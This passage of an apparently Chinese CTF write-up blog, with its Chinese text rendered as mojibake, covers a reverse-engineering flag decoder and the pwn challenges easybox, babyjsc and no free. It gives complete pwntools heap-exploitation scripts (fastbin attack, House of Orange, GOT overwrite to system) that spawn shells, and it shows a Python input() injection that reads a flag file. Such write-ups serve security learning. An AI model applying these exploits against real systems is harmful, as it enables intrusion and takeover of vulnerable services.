((<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">unsigned</span> __int8)inputs[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">2</span>);  inputs[<span class="hljs-number">0</span>] ^= <span class="hljs-number">0x23</span>u;  Sleep(<span class="hljs-number">6u</span>);  v1 = *(<span class="hljs-keyword">unsigned</span> __int8 *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">2</span>);  inputs[<span class="hljs-number">0</span>] += <span class="hljs-number">0x23</span>;  JUMPOUT(loc_4011EC);&#125;</code></pre></div><p>Patch åçš„ï¼Œå‹‰å¼ºå¯ä»¥çœ‹æ‡‚ã€‚å…¶ä¸­è‚¯å®šæ˜¯<code>inputs[i]</code>è¿›è¡Œå¤„ç†çš„ï¼Œå…¶ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåœ°æ–¹åœ¨åŠ 1ã€‚</p><div class="hljs"><pre><code class="hljs python">key = [    <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,     <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    key[i] -= <span class="hljs-number">0x23</span>    key[i] &amp;= <span class="hljs-number">0xff</span> <span class="hljs-comment">#æœ‰å¯èƒ½è¿ç®—åä¼šå°äº0çš„ï¼Œæ‰€ä»¥ç»™å¤„ç†ä¸€ä¸‹</span>    key[i] ^= <span class="hljs-number">0x23</span>    key[i] = ((key[i] &gt;&gt; <span class="hljs-number">6</span>) ^ (key[i] &lt;&lt; <span class="hljs-number">2</span>)) &amp; <span class="hljs-number">0xff</span>    flag += chr(key[i])print(flag)</code></pre></div><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>ubuntu 16ï¼Œoff by oneï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œéœ€è¦æ”»å‡»stdoutæ³„æ¼libcåœ°å€ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>ç”¨off by oneï¼Œæ„é€ å‡ºchunk overlapping ,å¹¶ä¸”æƒ³åŠæ³•é‡Šæ”¾å †å—ï¼Œè®©<code>main_arena_</code>è½åœ¨fastbinä¸­</li><li>ä¿®æ”¹è¿™ä¸ª<code>main_arena_</code>çš„æœ€å2ä¸ªå­—èŠ‚ï¼Œè®©å…¶æŒ‡å‘<code>stdout</code>é™„è¿‘å¸¦æœ‰<code>0x7f</code>çš„åœ°å€ï¼ˆå±äº0x70çš„fastbinå †å—ï¼‰</li><li>ä½¿ç”¨chunk overlapping ï¼Œæ¥ä¿®æ”¹ç©ºé—²çš„fastbin chainï¼Œä½¿å…¶ä¸­ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå¸¦æœ‰<code>main_arena</code>çš„å †å—ï¼Œè¿›è¡Œfastbin attackï¼Œä¿®æ”¹åˆ°stdoutå¤„çš„å†…å®¹ï¼Œleak libc</li><li>é‡å¤ä»¥ä¸Šçš„æ­¥éª¤ï¼Œæ„é€ ä¸€ä¸ªå †å—åˆ°<code>malloc_hook</code>å¤„ï¼Œå†™ä¸Šone gadget å³å¯ã€‚</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'101.200.53.148'</span>,<span class="hljs-number">34521</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloca</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-comment"># def pwn():</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">1</span>,<span class="hljs-number">0x4f0</span>,<span class="hljs-string">'\xdd\xd5'</span>)    alloca(<span class="hljs-number">2</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'aa'</span>)    free(<span class="hljs-number">0</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'/bin/sh\x00'</span>*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">'\xc1'</span>)    free(<span class="hljs-number">1</span>)    alloca(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xdd\xd5'</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">8</span>,<span class="hljs-number">0x160</span>,<span class="hljs-string">'aaaaaa'</span>)    alloca(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">10</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aa'</span>)    free(<span class="hljs-number">7</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x38</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + <span class="hljs-string">'\xe1'</span>)    free(<span class="hljs-number">8</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">9</span>)    free(<span class="hljs-number">5</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x160</span>    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x180</span>,payload)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x160</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">'\x20'</span>    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x180</span>,payload)    alloca(<span class="hljs-number">12</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    <span class="hljs-comment"># debug()</span>    alloca(<span class="hljs-number">13</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">14</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xed\xca'</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad3c80</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0</span>)    alloca(<span class="hljs-number">15</span>,<span class="hljs-number">0x60</span>,payload)<span class="hljs-comment"># leak_addr()</span>leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./pwn'</span>)        <span class="hljs-comment"># io = remote('101.200.53.148',34521)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)rec = <span class="hljs-number">0xf1207</span> + libc_base<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getshell</span><span class="hljs-params">()</span>:</span>    alloca(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">11</span>)    free(<span class="hljs-number">6</span>)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xed\xca'</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">13</span>)    free(<span class="hljs-number">12</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">'\x90'</span>    alloca(<span class="hljs-number">13</span>,<span class="hljs-number">0x90</span>,payload)    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    alloca(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(rec)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,payload)    <span class="hljs-comment"># debug()</span>    sleep(<span class="hljs-number">0.1</span>)    <span class="hljs-comment"># alloca(8,30,'1')</span>getshell()itr()</code></pre></div><p>æ·±å¤œå†™çš„expï¼Œä¼°è®¡æ„é€ å †å—çš„æ€è·¯æœ‰ç‚¹æ··ä¹±ã€‚ğŸ¤£ğŸ¤£</p><h3 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h3><p>æ¯”èµ›æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯ä¸ªwebpwnï¼Œä¸æ•¢å»åšã€‚ä½†æ˜¯å¾ˆå¤šé˜Ÿä¼åšå‡ºæ¥äº†ï¼Œè¯•ç€å»åšï¼Œçœ‹åˆ°server.py,ä¸äº†è§£jscï¼Œä»¥ä¸ºåªèƒ½æ‰§è¡Œjsä»£ç ï¼ŒåºŸäº†å¾ˆå¤§ç²¾åŠ›å†™jsæ¥è¯»å–flagï¼Œè¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚tclã€‚</p><p>æœ€åçœ‹wpï¼ŒçŸ¥é“äº†inputå‡½æ•°æœ¬èº«å°±æ˜¯ä¸ªæ¼æ´å‡½æ•°ï¼Œå…¶ä¼šå°†stdinè¾“å…¥çš„å†…å®¹å½“åšpythonä»£ç å»æ‰§è¡Œï¼ˆå°±åƒæ‰§è¡Œè®¡ç®—å¼ä¸€æ ·ï¼Œå°†å…¶çœ‹åšpythonä»£ç ï¼Œé€šè¿‡è®¡ç®—è¿”å›ç»“æœï¼‰ã€‚å½“ç„¶å¯ä»¥ç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡éœ€è¦å…ˆå€’å…¥osçš„æ¨¡å—ï¼Œç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><div class="hljs"><pre><code class="hljs python">__import__(<span class="hljs-string">'os'</span>).system(<span class="hljs-string">'cat /home/ctf/flag'</span>)</code></pre></div><p>å¯¹äºpythonï¼Œinputå‡½æ•°æ¼æ´ï¼Œå‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/weixin_34221332/article/details/92713257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34221332/article/details/92713257</a></p><h3 id="no-free"><a href="#no-free" class="headerlink" title="no free"></a>no free</h3><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><div class="hljs"><pre><code class="hljs python">*] <span class="hljs-string">'/ctf/work/ciscn2020/pwn/nofree/pwn'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å¼€çš„è¿˜æ˜¯å¾ˆå°‘çš„ï¼Œç„¶åno free æ˜æ˜¾éœ€è¦ä½¿ç”¨åˆ°hos of orangeè¿›è¡Œæ”»å‡»äº†ã€‚</p><h5 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><ul><li>åªèƒ½ç”³è¯·0-0x90å¤§å°çš„å †å—ï¼Œå †å—å·è‡ªå®šä¹‰0-2ï¼Œä¸”ç”±äºæ²¡æœ‰å¯¹å·²ç»å­˜åœ¨çš„å †å—å·éªŒè¯ï¼Œå¯ä»¥è¿›è¡Œæ— é™æ¬¡çš„ç”³è¯·åŒä¸€ä¸ªåºå·çš„å †å—ã€‚</li><li>å †å—åœ°å€å­˜åœ¨äº<code>0x06020C0  + 0x100</code> size è·Ÿåœ¨åé¢ã€‚</li><li><code>strdup</code> ç›¸å½“äº<code>malloc(stren(s))</code> </li></ul><h5 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h5><ul><li>å€˜è‹¥è¾“å…¥æ²¡æœ‰å­˜åœ¨çš„å †å—idxï¼Œç¨‹åºä¼šç›´æ¥è¿”å›</li><li><code>read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]);</code> è¿™é‡Œç”±äºæ˜¯è¿™æ ·çš„åˆ¤æ–­ï¼Œç»“åˆaddçš„<code>strdup</code> å°±é€ æˆäº†å †æº¢å‡ºã€‚</li></ul><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>éš¾ç‚¹åŸºæœ¬å°±åœ¨æ³„æ¼libcäº†ã€‚</p><ul><li>åˆ©ç”¨ç¨‹åºçš„å †æº¢å‡ºæ¼æ´ï¼Œä¿®æ”¹ä¸€ä¸‹top chunk</li><li>ç”³è¯·å¤šæ¬¡0å·0x90çš„å †å—ï¼Œæ¥æ¶ˆè€—ä¿®æ”¹åçš„top chunkï¼Œåˆ°è¾¾ä¸€å®šç¨‹åº¦åè¿›è¡Œhos of orangeæ”»å‡»ï¼Œè·å–ä¸€ä¸ªç©ºé—²çš„è¿›å…¥fastbinçš„å †å—</li><li>åˆ©ç”¨å †æº¢å‡ºï¼Œåœ¨fastbin chainä¸ŠåŠ ä¸€ä¸ª<code>0x06020C0  + 0x100</code> ï¼Œå‡†å¤‡è¿›è¡Œfastbin attackï¼Œæ¥è·å–ä¸€ä¸ªåœ¨å­˜æ”¾å †å—åœ°å€çš„å †å—ï¼Œè¿™æ ·å°±å®ç°äº†ä»»æ„åœ°å€å†™ã€‚</li><li>ä¿®æ”¹<code>atoi</code> çš„got è¡¨ä¸º printfï¼Œåˆ›é€ å‡ºä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>åˆ©ç”¨addä¸­çš„atoiï¼Œå®Œæˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¿®æ”¹<code>atoi</code> çš„gotè¡¨ä¸º<code>elf.plt[&#39;atoi&#39;] + 6</code> ï¼Œè®©å…¶å®Œæˆä¸€ä¸‹è§£æï¼Œé‡æ–°æ„é€ å‡ºæ­£å¸¸çš„atoiï¼ˆåŸå› ï¼šæµ‹é€Ÿä¸­å‘ç°ï¼Œç”¨editåŠŸèƒ½è¾“å…¥idxåç›´æ¥é€€å‡ºï¼Œåªèƒ½è®©å…¶æ¢å¤æ­£å¸¸ï¼Œå†è¿›è¡Œä»»æ„åœ°å€å†™ï¼‰</li><li>ä¿®æ”¹<code>atoi</code> çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶ååœ¨å‘é€ä¸ª<code>sh</code> ï¼Œå®Œæˆ<code>system(sh)</code></li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">"content"</span>,str(data))payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x40</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xfb1</span>)edit(<span class="hljs-number">0</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x90</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">24</span>):    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x10</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,payload)payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x6020C0</span> + <span class="hljs-number">0x100</span>)edit(<span class="hljs-number">1</span>,payload)payload = <span class="hljs-number">0x60</span> * <span class="hljs-string">'a'</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,payload)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = p64(<span class="hljs-number">0x0000000000602058</span>) + p64(<span class="hljs-number">0x90</span>)edit(<span class="hljs-number">0</span>,payload)edit(<span class="hljs-number">1</span>,p64(elf.plt[<span class="hljs-string">'printf'</span>]))sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%7$s'</span> + p64(<span class="hljs-number">0x000000000602018</span>)sa(<span class="hljs-string">'idx'</span>,payload)r(<span class="hljs-number">4</span>)r(<span class="hljs-number">4</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sys = libc_base + libc.sym[<span class="hljs-string">'system'</span>]sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%82c'</span> + <span class="hljs-string">'%8$hhn11'</span> + p64(<span class="hljs-number">0x000000000602058</span>)sa(<span class="hljs-string">'idx'</span>,payload)edit(<span class="hljs-number">1</span>,p64(sys))s(<span class="hljs-string">'sh'</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®</title>
    <link href="/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
    <url>/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®"><a href="#å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®"></a>å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p><p>æ³¨æ„ç½‘å¡é‚£å—ï¼Œè¦å¯¹åº”è‡ªå·±è™šæ‹Ÿæœºç½‘å¡çš„æƒ…å†µã€‚</p><h5 id="å¯åŠ¨å‘½ä»¤ï¼š"><a href="#å¯åŠ¨å‘½ä»¤ï¼š" class="headerlink" title="å¯åŠ¨å‘½ä»¤ï¼š"></a>å¯åŠ¨å‘½ä»¤ï¼š</h5><div class="hljs"><pre><code class="hljs python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append <span class="hljs-string">"root=/dev/sda console=tty50"</span>  -net nic -net tap</code></pre></div><h4 id="æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥"><a href="#æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥" class="headerlink" title="æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥"></a>æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥</h4><div class="hljs"><pre><code class="hljs bash">scp -r /path/maze username@servername:/path</code></pre></div><h4 id="ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ"><a href="#ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ" class="headerlink" title="ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ"></a>ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ</h4><div class="hljs"><pre><code class="hljs bash">fgets(buf,0x28,_stdin);len = strlen(buf);uStack68 = 0x20;<span class="hljs-keyword">if</span> (*(char *)((int)&amp;uStack68 + len + 3) == <span class="hljs-string">'\n'</span>) &#123;  *(undefined *)((int)&amp;uStack68 + len + 3) = 0;  len = len - 1;&#125;<span class="hljs-keyword">if</span> (len != 0x20) &#123;  